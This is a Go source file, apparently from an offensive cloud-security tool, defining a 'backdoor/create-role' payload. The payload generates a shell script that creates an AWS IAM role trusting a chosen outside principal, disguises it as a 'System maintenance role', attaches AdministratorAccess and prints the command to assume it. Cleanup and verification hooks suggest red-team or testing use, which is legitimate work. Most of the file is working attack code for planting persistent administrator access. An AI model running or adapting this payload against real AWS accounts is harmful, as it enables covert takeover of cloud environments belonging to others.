// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package batch

import (
	"context"
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorCreateRolePayload generates a shell script that creates a new IAM role with
// a custom trust policy and attaches AdministratorAccess.
//
// This payload generates a multi-command shell script and requires CONTAINER_RUNTIME=generic
// with an image that has both sh and the AWS CLI installed.
type BackdoorCreateRolePayload struct{}

func init() {
	_ = payloads.Register(&BackdoorCreateRolePayload{})
}

func (p *BackdoorCreateRolePayload) GetName() string {
	return "backdoor/create-role"
}

func (p *BackdoorCreateRolePayload) GetDescription() string {
	return "Create an IAM role with AdministratorAccess and a custom trust policy via Batch job (requires CONTAINER_RUNTIME=generic)"
}

func (p *BackdoorCreateRolePayload) GetTags() []string {
	return []string{
		payloads.TagServiceBatch,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateRolePayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Trusted principal ARN (e.g. arn:aws:iam::123456789012:user/name) or service (e.g. lambda.amazonaws.com)",
			Required:    true,
		},
		{
			Name:        "ROLE_NAME",
			Description: "Name for the backdoor role (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "EXTERNAL_ID",
			Description: "External ID condition for the trust policy",
			Required:    false,
			Default:     "",
		},
	}
}

func (p *BackdoorCreateRolePayload) Validate(options map[string]string) error {
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/create-role payload")
	}
	return nil
}

// GenerateCode returns a shell script that creates an IAM role with admin access.
// Requires CONTAINER_RUNTIME=generic since it uses multiple shell commands.
func (p *BackdoorCreateRolePayload) GenerateCode(options map[string]string) (string, error) {
	trustPrincipal := options["TRUST_PRINCIPAL"]
	roleName := options["ROLE_NAME"]
	externalID := options["EXTERNAL_ID"]

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	roleNameSetup := ""
	if roleName != "" {
		roleNameSetup = fmt.Sprintf(`ROLE_NAME="%s"`, roleName)
	} else {
		roleNameSetup = `ROLE_NAME="pathrunner-backdoor-$(date +%s)"`
	}

	externalIDCondition := ""
	if externalID != "" {
		externalIDCondition = fmt.Sprintf(`,
                "Condition": {
                    "StringEquals": {
                        "sts:ExternalId": "%s"
                    }
                }`, externalID)
	}

	script := fmt.Sprintf(`set -e
%s

TRUST_POLICY='{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "%s": "%s"
            },
            "Action": "sts:AssumeRole"%s
        }
    ]
}'

echo "Creating IAM role: $ROLE_NAME..."
CREATE_OUTPUT=$(aws iam create-role \
    --role-name "$ROLE_NAME" \
    --assume-role-policy-document "$TRUST_POLICY" \
    --description "System maintenance role" \
    --max-session-duration 43200 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not create role: $CREATE_OUTPUT"
    exit 1
fi

ROLE_ARN=$(echo "$CREATE_OUTPUT" | grep -o '"Arn": "[^"]*"' | cut -d'"' -f4)
echo "Role created: $ROLE_ARN"

echo "Attaching AdministratorAccess policy..."
aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -ne 0 ]; then
    echo "FAILED: Could not attach policy"
    exit 1
fi

echo "SUCCESS: Role $ROLE_NAME created with AdministratorAccess"
echo "Role ARN: $ROLE_ARN"
echo "Assume command: aws sts assume-role --role-arn $ROLE_ARN --role-session-name pathrunner-session"
`, roleNameSetup, principalKey, trustPrincipal, externalIDCondition)

	return strings.TrimLeft(script, "\n"), nil
}

// VerifySuccess checks that the backdoor role exists.
func (p *BackdoorCreateRolePayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	roleName := options["ROLE_NAME"]
	if roleName == "" {
		return false, fmt.Errorf("ROLE_NAME not set; cannot verify auto-generated role name")
	}

	iamClient := iam.NewFromConfig(config)
	_, err := iamClient.GetRole(ctx, &iam.GetRoleInput{
		RoleName: aws.String(roleName),
	})
	if err != nil {
		return false, nil
	}

	return true, nil
}

// ReportSideEffects returns the created role as a tracked resource for cleanup.
func (p *BackdoorCreateRolePayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	roleName := options["ROLE_NAME"]
	if roleName == "" {
		roleName = "pathrunner-backdoor-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:role",
			Name:          roleName,
			CleanupMethod: "iam:DeleteRole",
			Metadata: map[string]string{
				"trust_principal": options["TRUST_PRINCIPAL"],
			},
		},
	}
}

// ProcessResult returns the raw result.
func (p *BackdoorCreateRolePayload) ProcessResult(result string) (string, error) {
	return result, nil
}
